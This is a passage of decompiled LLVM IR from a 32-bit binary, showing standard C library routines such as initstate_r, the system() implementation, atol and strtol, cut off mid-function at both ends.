  %v2_8053a29 = inttoptr i32 %v1_8053a29 to i32*
  %v3_8053a29 = load i32, i32* %v2_8053a29, align 4
  store i32 %v3_8053a29, i32* %ecx.global-to-local, align 4
  %v6_8053a2f = icmp ugt i32 %v3_8053a29, 4
  br i1 %v6_8053a2f, label %dec_label_pc_8053aa9, label %dec_label_pc_8053a31

dec_label_pc_8053a31:                             ; preds = %entry
  %v1_8053a31 = add i32 %tmp14, 8
  %v2_8053a31 = inttoptr i32 %v1_8053a31 to i32*
  %v3_8053a31 = load i32, i32* %v2_8053a31, align 4
  store i32 %v3_8053a31, i32* %ebx.global-to-local, align 4
  %v1_8053a34 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8053a3b = select i1 %v1_8053a34, i32 1, i32 %arg1
  store i32 %v3_8053a3b, i32* %edx.global-to-local, align 4
  %v1_8053a3e = icmp eq i32 %v3_8053a29, 0
  %v2_8053a40 = inttoptr i32 %v3_8053a31 to i32*
  store i32 %v3_8053a3b, i32* %v2_8053a40, align 4
  br i1 %v1_8053a3e, label %dec_label_pc_8053aa7, label %dec_label_pc_8053a44

dec_label_pc_8053a44:                             ; preds = %dec_label_pc_8053a31
  %v0_8053a44 = load i32, i32* @esi, align 4
  %v1_8053a44 = add i32 %v0_8053a44, 16
  %v2_8053a44 = inttoptr i32 %v1_8053a44 to i32*
  %v3_8053a44 = load i32, i32* %v2_8053a44, align 4
  store i32 %v3_8053a44, i32* %eax.global-to-local, align 4
  %v0_8053a47 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053a47, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8053a4e = sext i32 %v3_8053a44 to i64
  store i64 %v4_8053a4e, i64* %stack_var_-40, align 8
  %v5_8053a8432 = icmp sgt i32 %v3_8053a44, 1
  br i1 %v5_8053a8432, label %dec_label_pc_8053a53, label %dec_label_pc_8053a86

dec_label_pc_8053a53:                             ; preds = %dec_label_pc_8053a44, %dec_label_pc_8053a53.dec_label_pc_8053a53_crit_edge
  %v0_8053a7b = phi i32 [ %v0_8053a7b.pre, %dec_label_pc_8053a53.dec_label_pc_8053a53_crit_edge ], [ %v0_8053a47, %dec_label_pc_8053a44 ]
  %v0_8053a53 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053a5a = ashr i32 %v0_8053a53, 31
  %v2_8053a5b = zext i32 %v0_8053a53 to i64
  %v4_8053a5b = zext i32 %v1_8053a5a to i64
  %v5_8053a5b = mul nuw i64 %v4_8053a5b, 4294967296
  %v6_8053a5b = or i64 %v5_8053a5b, %v2_8053a5b
  %v8_8053a5b = sdiv i64 %v6_8053a5b, 127773
  %v9_8053a5b = trunc i64 %v8_8053a5b to i32
  %v10_8053a5b = srem i64 %v6_8053a5b, 127773
  %v3_8053a61 = mul nsw i64 %v10_8053a5b, 16807
  %v4_8053a61 = trunc i64 %v3_8053a61 to i32
  %tmp24 = mul i32 %v9_8053a5b, -2836
  %v2_8053a6d = add i32 %v4_8053a61, %tmp24
  %v1_8053a6f = add i32 %v2_8053a6d, 1
  %v6_8053a6f = xor i32 %v2_8053a6d, -2147483648
  %v7_8053a6f = xor i32 %v1_8053a6f, %v2_8053a6d
  %v8_8053a6f = and i32 %v7_8053a6f, %v6_8053a6f
  %v9_8053a6f = icmp slt i32 %v8_8053a6f, 0
  %v10_8053a6f = icmp eq i32 %v1_8053a6f, 0
  %v11_8053a6f = icmp slt i32 %v1_8053a6f, 0
  %v1_8053a72 = add i32 %v2_8053a6d, 2147483647
  store i32 %v1_8053a72, i32* %eax.global-to-local, align 4
  %v3_8053a78 = icmp ne i1 %v11_8053a6f, %v9_8053a6f
  %v4_8053a78 = or i1 %v10_8053a6f, %v3_8053a78
  %v7_8053a78 = select i1 %v4_8053a78, i32 %v1_8053a72, i32 %v2_8053a6d
  store i32 %v7_8053a78, i32* %edx.global-to-local, align 4
  %v1_8053a7b = add i32 %v0_8053a7b, 4
  store i32 %v1_8053a7b, i32* %ecx.global-to-local, align 4
  %v2_8053a7e = inttoptr i32 %v1_8053a7b to i32*
  store i32 %v7_8053a78, i32* %v2_8053a7e, align 4
  %v0_8053a80 = load i32, i32* @edi, align 4
  %v1_8053a80 = add i32 %v0_8053a80, 1
  store i32 %v1_8053a80, i32* @edi, align 4
  %v3_8053a81.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8053a81.pre to i32
  %v5_8053a84 = icmp slt i32 %v1_8053a80, %extract.t11
  br i1 %v5_8053a84, label %dec_label_pc_8053a53.dec_label_pc_8053a53_crit_edge, label %dec_label_pc_8053a81.dec_label_pc_8053a86_crit_edge

dec_label_pc_8053a53.dec_label_pc_8053a53_crit_edge: ; preds = %dec_label_pc_8053a53
  %v0_8053a7b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053a53

dec_label_pc_8053a81.dec_label_pc_8053a86_crit_edge: ; preds = %dec_label_pc_8053a53
  %v0_8053a86.pre = load i32, i32* @esi, align 4
  %v0_8053a89.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a86

dec_label_pc_8053a86:                             ; preds = %dec_label_pc_8053a81.dec_label_pc_8053a86_crit_edge, %dec_label_pc_8053a44
  %v0_8053a89 = phi i32 [ %v0_8053a89.pre, %dec_label_pc_8053a81.dec_label_pc_8053a86_crit_edge ], [ %v0_8053a47, %dec_label_pc_8053a44 ]
  %v0_8053a86 = phi i32 [ %v0_8053a86.pre, %dec_label_pc_8053a81.dec_label_pc_8053a86_crit_edge ], [ %v0_8053a44, %dec_label_pc_8053a44 ]
  %v1_8053a86 = add i32 %v0_8053a86, 20
  %v2_8053a86 = inttoptr i32 %v1_8053a86 to i32*
  %v3_8053a86 = load i32, i32* %v2_8053a86, align 4
  store i32 %v3_8053a86, i32* %eax.global-to-local, align 4
  %v2_8053a89 = add i32 %v0_8053a86, 4
  %v3_8053a89 = inttoptr i32 %v2_8053a89 to i32*
  store i32 %v0_8053a89, i32* %v3_8053a89, align 4
  %v0_8053a8c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a8c = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a8c = mul i32 %v1_8053a8c, 4
  %v3_8053a8c = add i32 %v2_8053a8c, %v0_8053a8c
  store i32 %v3_8053a8c, i32* %eax.global-to-local, align 4
  %v1_8053a8f = load i32, i32* @esi, align 4
  %v2_8053a8f = inttoptr i32 %v1_8053a8f to i32*
  store i32 %v3_8053a8c, i32* %v2_8053a8f, align 4
  %v3_8053a91 = load i64, i64* %stack_var_-40, align 8
  %v6_8053a91 = mul nsw i64 %v3_8053a91, 10
  %v7_8053a91 = trunc i64 %v6_8053a91 to i32
  %v2_8053a97 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8053aa425 = add i32 %v7_8053a91, -1
  %v9_8053aa429 = icmp slt i32 %v1_8053aa425, 0
  store i32 %v1_8053aa425, i32* @ebx, align 4
  %v1_8053aa530 = icmp eq i1 %v9_8053aa429, false
  br i1 %v1_8053aa530, label %dec_label_pc_8053a97, label %dec_label_pc_8053aa7

dec_label_pc_8053a97:                             ; preds = %dec_label_pc_8053a86, %dec_label_pc_8053a97
  store i32 %v2_8053a97, i32* %eax.global-to-local, align 4
  %v0_8053a9c = load i32, i32* @esi, align 4
  %v2_8053a9d = inttoptr i32 %v0_8053a9c to i32*
  %v3_8053a9d = call i32 @__GI_random_r(i32* %v2_8053a9d, i32 %v2_8053a97)
  store i32 %v0_8053a9c, i32* %eax.global-to-local, align 4
  store i32 %v2_8053a97, i32* %edx.global-to-local, align 4
  %v0_8053aa4.pre = load i32, i32* @ebx, align 4
  %v1_8053aa4 = add i32 %v0_8053aa4.pre, -1
  %v9_8053aa4 = icmp slt i32 %v1_8053aa4, 0
  store i32 %v1_8053aa4, i32* @ebx, align 4
  %v1_8053aa5 = icmp eq i1 %v9_8053aa4, false
  br i1 %v1_8053aa5, label %dec_label_pc_8053a97, label %dec_label_pc_8053aa7

dec_label_pc_8053aa7:                             ; preds = %dec_label_pc_8053a86, %dec_label_pc_8053a97, %dec_label_pc_8053a31
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053aa9

dec_label_pc_8053aa9:                             ; preds = %entry, %dec_label_pc_8053aa7
  %v0_8053ab0 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8053aa7 ]
  store i32 %v0_8053a1d, i32* @ebx, align 4
  store i32 %v0_8053a1c, i32* @esi, align 4
  store i32 %v0_8053a1b, i32* @edi, align 4
  store i32 %v0_8053a17, i32* @ebp, align 4
  ret i32 %v0_8053ab0

; uselistorder directives
  uselistorder i32 %v1_8053aa4, { 1, 0 }
  uselistorder i32 %v0_8053a86, { 1, 0 }
  uselistorder i32 %v1_8053a6f, { 2, 1, 0 }
  uselistorder i32 %v2_8053a6d, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8053a47, { 1, 0, 2 }
  uselistorder i32 %v3_8053a29, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa9, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053a97, { 1, 0 }
  uselistorder label %dec_label_pc_8053a53, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8053ab3 = load i32, i32* @esi, align 4
  %v0_8053ab4 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8053ad5, label %dec_label_pc_8053ac9

dec_label_pc_8053ac9:                             ; preds = %entry
  %v2_8053ac9 = icmp ult i32 %arg3, 256
  %v1_8053ad0 = select i1 %v2_8053ac9, i32 5, i32 4
  store i32 %v1_8053ad0, i32* @ebx, align 4
  br label %dec_label_pc_8053aeb

dec_label_pc_8053ad5:                             ; preds = %entry
  %v6_8053ad8 = icmp ugt i32 %arg3, 31
  br i1 %v6_8053ad8, label %dec_label_pc_8053ae3, label %dec_label_pc_8053ada

dec_label_pc_8053ada:                             ; preds = %dec_label_pc_8053ad5
  store i32 0, i32* @ebx, align 4
  %v6_8053adf = icmp ugt i32 %arg3, 7
  br i1 %v6_8053adf, label %dec_label_pc_8053aeb, label %dec_label_pc_8053b3b

dec_label_pc_8053ae3:                             ; preds = %dec_label_pc_8053ad5
  %v2_8053ae3 = icmp ult i32 %arg3, 64
  %v1_8053ae8 = select i1 %v2_8053ae3, i32 3, i32 2
  store i32 %v1_8053ae8, i32* @ebx, align 4
  br label %dec_label_pc_8053aeb

dec_label_pc_8053aeb:                             ; preds = %dec_label_pc_8053ada, %dec_label_pc_8053ac9, %dec_label_pc_8053ae3
  %v0_8053af5 = phi i32 [ 0, %dec_label_pc_8053ada ], [ %v1_8053ad0, %dec_label_pc_8053ac9 ], [ %v1_8053ae8, %dec_label_pc_8053ae3 ]
  %v1_8053aeb = mul nuw nsw i32 %v0_8053af5, 4
  %v2_8053aeb = add i32 %v1_8053aeb, ptrtoint (i32* @global_var_80610d4.758 to i32)
  %v3_8053aeb = inttoptr i32 %v2_8053aeb to i32*
  %v4_8053aeb = load i32, i32* %v3_8053aeb, align 4
  store i32 %v4_8053aeb, i32* %eax.global-to-local, align 4
  %v1_8053af2 = add i32 %tmp7, 4
  store i32 %v1_8053af2, i32* @esi, align 4
  %v2_8053af5 = add i32 %v1_8053aeb, ptrtoint (i32* @global_var_80610c0.759 to i32)
  %v3_8053af5 = inttoptr i32 %v2_8053af5 to i32*
  %v4_8053af5 = load i32, i32* %v3_8053af5, align 4
  store i32 %v4_8053af5, i32* %edx.global-to-local, align 4
  %v2_8053afc = add i32 %arg4, 12
  %v3_8053afc = inttoptr i32 %v2_8053afc to i32*
  store i32 %v0_8053af5, i32* %v3_8053afc, align 4
  %v0_8053aff = load i32, i32* @esi, align 4
  %v1_8053aff = load i32, i32* @edi, align 4
  %v2_8053aff = add i32 %v1_8053aff, 8
  %v3_8053aff = inttoptr i32 %v2_8053aff to i32*
  store i32 %v0_8053aff, i32* %v3_8053aff, align 4
  %v0_8053b02 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b02 = load i32, i32* @edi, align 4
  %v2_8053b02 = add i32 %v1_8053b02, 16
  %v3_8053b02 = inttoptr i32 %v2_8053b02 to i32*
  store i32 %v0_8053b02, i32* %v3_8053b02, align 4
  %v0_8053b05 = load i32, i32* @esi, align 4
  %v1_8053b05 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053b05 = mul i32 %v1_8053b05, 4
  %v3_8053b05 = add i32 %v2_8053b05, %v0_8053b05
  store i32 %v3_8053b05, i32* %eax.global-to-local, align 4
  %v0_8053b08 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053b08 = load i32, i32* @edi, align 4
  %v2_8053b08 = add i32 %v1_8053b08, 20
  %v3_8053b08 = inttoptr i32 %v2_8053b08 to i32*
  store i32 %v0_8053b08, i32* %v3_8053b08, align 4
  %v0_8053b0b = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b0b = load i32, i32* @edi, align 4
  %v2_8053b0b = add i32 %v1_8053b0b, 24
  %v3_8053b0b = inttoptr i32 %v2_8053b0b to i32*
  store i32 %v0_8053b0b, i32* %v3_8053b0b, align 4
  %v0_8053b0e = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8053b13 = inttoptr i32 %v0_8053b0e to i32*
  %v3_8053b13 = call i32 @srandom_r(i32 %arg1, i32* %v2_8053b13)
  %v0_8053b18 = load i32, i32* @ebp, align 4
  %v1_8053b18 = inttoptr i32 %v0_8053b18 to i32*
  store i32 0, i32* %v1_8053b18, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053b23 = load i32, i32* @ebx, align 4
  %v1_8053b23 = icmp eq i32 %v0_8053b23, 0
  br i1 %v1_8053b23, label %dec_label_pc_8053b54, label %dec_label_pc_8053b27

dec_label_pc_8053b27:                             ; preds = %dec_label_pc_8053aeb
  %v0_8053b27 = load i32, i32* @edi, align 4
  %v1_8053b27 = add i32 %v0_8053b27, 4
  %v2_8053b27 = inttoptr i32 %v1_8053b27 to i32*
  %v3_8053b27 = load i32, i32* %v2_8053b27, align 4
  %v1_8053b2a = load i32, i32* @esi, align 4
  %v2_8053b2a = sub i32 %v3_8053b27, %v1_8053b2a
  %v2_8053b2c = sdiv i32 %v2_8053b2a, 4
  %v3_8053b2f = mul i32 %v2_8053b2c, 5
  %v2_8053b32 = add i32 %v3_8053b2f, %v0_8053b23
  %v1_8053b34 = load i32, i32* @ebp, align 4
  %v2_8053b34 = inttoptr i32 %v1_8053b34 to i32*
  store i32 %v2_8053b32, i32* %v2_8053b34, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b54

dec_label_pc_8053b3b:                             ; preds = %dec_label_pc_8053ada
  %v1_8053b3b = call i32 @__errno_location(i32 %v0_8053ab4)
  store i32 %v1_8053b3b, i32* %eax.global-to-local, align 4
  %v1_8053b40 = inttoptr i32 %v1_8053b3b to i32*
  store i32 22, i32* %v1_8053b40, align 4
  %v0_8053b46 = load i32, i32* %stack_var_-36, align 4
  %v1_8053b46 = call i32 @__errno_location(i32 %v0_8053b46)
  %v1_8053b4b = inttoptr i32 %v1_8053b46 to i32*
  store i32 22, i32* %v1_8053b4b, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b54

dec_label_pc_8053b54:                             ; preds = %dec_label_pc_8053aeb, %dec_label_pc_8053b27, %dec_label_pc_8053b3b
  %v0_8053b5b = phi i32 [ 0, %dec_label_pc_8053aeb ], [ 0, %dec_label_pc_8053b27 ], [ -1, %dec_label_pc_8053b3b ]
  store i32 %v0_8053ab3, i32* @esi, align 4
  ret i32 %v0_8053b5b

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053b54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053aeb, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8053b5c = load i32, i32* @ebx, align 4
  %v4_8053b65 = icmp eq i32 %arg1, 0
  br i1 %v4_8053b65, label %dec_label_pc_8053c88, label %dec_label_pc_8053b70

dec_label_pc_8053b70:                             ; preds = %entry
  %v2_8053b76 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053b85 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8053b94 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8053b9d = call i32 @__vfork(i32 %v2_8053b94)
  %v2_8053ba5 = icmp slt i32 %v1_8053b9d, 0
  store i32 %v1_8053b9d, i32* @ebx, align 4
  %v2_8053baa = icmp eq i1 %v2_8053ba5, false
  br i1 %v2_8053baa, label %dec_label_pc_8053bdb, label %dec_label_pc_8053bac

dec_label_pc_8053bac:                             ; preds = %dec_label_pc_8053b70
  %v2_8053bb4 = call i32 @__bsd_signal(i32 3, i32 %v2_8053b76)
  store i32 %v2_8053b76, i32* @edx, align 4
  %v2_8053bc1 = call i32 @__bsd_signal(i32 2, i32 %v2_8053b85)
  store i32 2, i32* @ebx, align 4
  %v2_8053bce = call i32 @__bsd_signal(i32 17, i32 %v2_8053b94)
  br label %dec_label_pc_8053c85

dec_label_pc_8053bdb:                             ; preds = %dec_label_pc_8053b70
  %v1_8053ba5 = icmp eq i32 %v1_8053b9d, 0
  %v1_8053bdb = icmp eq i1 %v1_8053ba5, false
  br i1 %v1_8053bdb, label %dec_label_pc_8053c27, label %dec_label_pc_8053bdd

dec_label_pc_8053bdd:                             ; preds = %dec_label_pc_8053bdb
  %v2_8053be3 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8053bee = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8053bf9 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8053c18 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_80610eb.762 to i32), i32 ptrtoint ([3 x i8]* @global_var_80610f0.761 to i32), i32 ptrtoint ([3 x i8]* @global_var_80610e8.760 to i32), i32 %arg1, i32 0)
  %v1_8053c22 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8053c27:                             ; preds = %dec_label_pc_8053bdb
  %v2_8053c2d = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053c38 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8053c3d = ptrtoint i32* %stack_var_-8 to i32
  %v0_8053c46 = load i32, i32* @ebx, align 4
  %v7_8053c47 = call i32 @wait4(i32 %v0_8053c46, i32 %v2_8053c3d, i32 0, i32 0)
  %v8_8053c52 = icmp eq i32 %v7_8053c47, -1
  %v1_8053c53 = icmp eq i1 %v8_8053c52, false
  %v6_8053c53 = load i32, i32* %stack_var_-8, align 4
  %v7_8053c53 = select i1 %v1_8053c53, i32 %v6_8053c53, i32 -1
  store i32 %v7_8053c53, i32* @edx, align 4
  store i32 %v7_8053c53, i32* %stack_var_-8, align 4
  %v2_8053c62 = call i32 @__bsd_signal(i32 3, i32 %v2_8053b76)
  store i32 %v2_8053b76, i32* @ebx, align 4
  %v2_8053c6f = call i32 @__bsd_signal(i32 2, i32 %v2_8053b85)
  store i32 %v2_8053b85, i32* @edx, align 4
  %v2_8053c7c = call i32 @__bsd_signal(i32 17, i32 %v2_8053b94)
  %v3_8053c81 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053c85

dec_label_pc_8053c85:                             ; preds = %dec_label_pc_8053bac, %dec_label_pc_8053c27
  %storemerge = phi i32 [ -1, %dec_label_pc_8053bac ], [ %v3_8053c81, %dec_label_pc_8053c27 ]
  br label %dec_label_pc_8053c88

dec_label_pc_8053c88:                             ; preds = %entry, %dec_label_pc_8053c85
  %v0_8053c8c = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8053c85 ]
  store i32 %v0_8053b5c, i32* @ebx, align 4
  ret i32 %v0_8053c8c

; uselistorder directives
  uselistorder i32 %v1_8053b9d, { 2, 0, 1 }
  uselistorder i32 %v2_8053b94, { 1, 0, 2 }
  uselistorder i32 %v2_8053b85, { 0, 2, 1 }
  uselistorder i32 %v2_8053b76, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_8053c88, { 1, 0 }
  uselistorder label %dec_label_pc_8053c85, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053c9b = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8053c9b
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8053cb5 = inttoptr i32 %arg1 to i8*
  %v5_8053cb5 = call i32 @_stdlib_strto_l(i8* %v4_8053cb5, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053cb5
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053cc3 = load i32, i32* @ebx, align 4
  store i32 %v0_8053cc3, i32* %stack_var_-16, align 4
  %v4_8053cc7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053cc7, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8053ccf = load i32, i32* @global_var_80622cc, align 4
  store i32 %v0_8053ccf, i32* %edx.global-to-local, align 4
  store i32 %v4_8053cc7, i32* %ebx.global-to-local, align 4
  %v2_8053cda41 = load i8, i8* %arg1, align 1
  %v3_8053cda42 = sext i8 %v2_8053cda41 to i32
  store i32 %v3_8053cda42, i32* %eax.global-to-local, align 4
  %v2_8053cdd43 = mul nsw i32 %v3_8053cda42, 2
  %v3_8053cdd44 = add i32 %v2_8053cdd43, %v0_8053ccf
  %v4_8053cdd45 = inttoptr i32 %v3_8053cdd44 to i8*
  %v5_8053cdd46 = load i8, i8* %v4_8053cdd45, align 1
  %v6_8053cdd47 = and i8 %v5_8053cdd46, 32
  %v7_8053cdd48 = icmp eq i8 %v6_8053cdd47, 0
  %v1_8053ce149 = icmp eq i1 %v7_8053cdd48, false
  br i1 %v1_8053ce149, label %dec_label_pc_8053cd9, label %dec_label_pc_8053ce3

dec_label_pc_8053cd9:                             ; preds = %entry, %dec_label_pc_8053cd9
  %v0_8053cd950 = phi i32 [ %v1_8053cd9, %dec_label_pc_8053cd9 ], [ %v4_8053cc7, %entry ]
  %v1_8053cd9 = add i32 %v0_8053cd950, 1
  store i32 %v1_8053cd9, i32* %ebx.global-to-local, align 4
  %v1_8053cda = inttoptr i32 %v1_8053cd9 to i8*
  %v2_8053cda = load i8, i8* %v1_8053cda, align 1
  %v3_8053cda = sext i8 %v2_8053cda to i32
  store i32 %v3_8053cda, i32* %eax.global-to-local, align 4
  %v2_8053cdd = mul nsw i32 %v3_8053cda, 2
  %v3_8053cdd = add i32 %v2_8053cdd, %v0_8053ccf
  %v4_8053cdd = inttoptr i32 %v3_8053cdd to i8*
  %v5_8053cdd = load i8, i8* %v4_8053cdd, align 1
  %v6_8053cdd = and i8 %v5_8053cdd, 32
  %v7_8053cdd = icmp eq i8 %v6_8053cdd, 0
  %v1_8053ce1 = icmp eq i1 %v7_8053cdd, false
  br i1 %v1_8053ce1, label %dec_label_pc_8053cd9, label %dec_label_pc_8053ce3

dec_label_pc_8053ce3:                             ; preds = %dec_label_pc_8053cd9, %entry
  %v0_8053cd9.lcssa = phi i32 [ %v4_8053cc7, %entry ], [ %v1_8053cd9, %dec_label_pc_8053cd9 ]
  %v2_8053cda.lcssa = phi i8 [ %v2_8053cda41, %entry ], [ %v2_8053cda, %dec_label_pc_8053cd9 ]
  %v3_8053cda.lcssa = phi i32 [ %v3_8053cda42, %entry ], [ %v3_8053cda, %dec_label_pc_8053cd9 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8053ce3 = icmp eq i8 %v2_8053cda.lcssa, 43
  br i1 %v9_8053ce3, label %dec_label_pc_8053cfe, label %dec_label_pc_8053ce8

dec_label_pc_8053ce8:                             ; preds = %dec_label_pc_8053ce3
  %v9_8053ce8 = icmp eq i8 %v2_8053cda.lcssa, 45
  %v1_8053cf0 = icmp eq i1 %v9_8053ce8, false
  br i1 %v1_8053cf0, label %dec_label_pc_8053cff, label %dec_label_pc_8053cfe

dec_label_pc_8053cfe:                             ; preds = %dec_label_pc_8053ce3, %dec_label_pc_8053ce8
  %storemerge5 = phi i8 [ 1, %dec_label_pc_8053ce8 ], [ 0, %dec_label_pc_8053ce3 ]
  %v1_8053cfe = add i32 %v0_8053cd9.lcssa, 1
  store i32 %v1_8053cfe, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cff

dec_label_pc_8053cff:                             ; preds = %dec_label_pc_8053ce8, %dec_label_pc_8053cfe
  %v0_8053d11 = phi i32 [ %v1_8053cfe, %dec_label_pc_8053cfe ], [ %v0_8053cd9.lcssa, %dec_label_pc_8053ce8 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8053cfe ], [ 0, %dec_label_pc_8053ce8 ]
  %v1_8053cff = and i32 %arg3, -17
  %v2_8053cff = icmp eq i32 %v1_8053cff, 0
  %v1_8053d07 = icmp eq i1 %v2_8053cff, false
  br i1 %v1_8053d07, label %dec_label_pc_8053d2d, label %dec_label_pc_8053d09

dec_label_pc_8053d09:                             ; preds = %dec_label_pc_8053cff
  %v1_8053d09 = add i32 %arg3, 10
  store i32 %v1_8053d09, i32* %esi.global-to-local, align 4
  %v1_8053d0c = inttoptr i32 %v0_8053d11 to i8*
  %v2_8053d0c = load i8, i8* %v1_8053d0c, align 1
  %v8_8053d0c = icmp eq i8 %v2_8053d0c, 48
  %v1_8053d0f = icmp eq i1 %v8_8053d0c, false
  br i1 %v1_8053d0f, label %dec_label_pc_8053d22, label %dec_label_pc_8053d11

dec_label_pc_8053d11:                             ; preds = %dec_label_pc_8053d09
  %v1_8053d11 = add i32 %v0_8053d11, 1
  store i32 %v1_8053d11, i32* %ebx.global-to-local, align 4
  %v1_8053d12 = add i32 %arg3, 8
  store i32 %v1_8053d12, i32* %esi.global-to-local, align 4
  %v1_8053d15 = inttoptr i32 %v1_8053d11 to i8*
  %v2_8053d15 = load i8, i8* %v1_8053d15, align 1
  %v2_8053d19 = or i8 %v2_8053d15, 32
  %v7_8053d19 = zext i8 %v2_8053d19 to i32
  %v9_8053d19 = and i32 %v3_8053cda.lcssa, -256
  %v10_8053d19 = or i32 %v7_8053d19, %v9_8053d19
  store i32 %v10_8053d19, i32* %eax.global-to-local, align 4
  %v10_8053d1b = icmp eq i8 %v2_8053d19, 120
  %v1_8053d1d = icmp eq i1 %v10_8053d1b, false
  br i1 %v1_8053d1d, label %dec_label_pc_8053d22, label %dec_label_pc_8053d1f

dec_label_pc_8053d1f:                             ; preds = %dec_label_pc_8053d11
  %v2_8053d1f = mul i32 %v1_8053d12, 2
  store i32 %v2_8053d1f, i32* %esi.global-to-local, align 4
  %v1_8053d21 = add i32 %v0_8053d11, 2
  store i32 %v1_8053d21, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053d22

dec_label_pc_8053d22:                             ; preds = %dec_label_pc_8053d11, %dec_label_pc_8053d09, %dec_label_pc_8053d1f
  %v0_8053d4a13 = phi i32 [ %v1_8053d11, %dec_label_pc_8053d11 ], [ %v0_8053d11, %dec_label_pc_8053d09 ], [ %v1_8053d21, %dec_label_pc_8053d1f ]
  %v0_8053da422 = phi i32 [ %v1_8053d11, %dec_label_pc_8053d11 ], [ %v4_8053cc7, %dec_label_pc_8053d09 ], [ %v1_8053d11, %dec_label_pc_8053d1f ]
  %v3_8053d2a = phi i32 [ %v1_8053d12, %dec_label_pc_8053d11 ], [ %v1_8053d09, %dec_label_pc_8053d09 ], [ %v2_8053d1f, %dec_label_pc_8053d1f ]
  %v1_8053d22 = add i32 %v3_8053d2a, -17
  %v6_8053d22 = sub i32 16, %v3_8053d2a
  %v7_8053d22 = and i32 %v6_8053d22, %v3_8053d2a
  %v8_8053d22 = icmp slt i32 %v7_8053d22, 0
  %v10_8053d22 = icmp slt i32 %v1_8053d22, 0
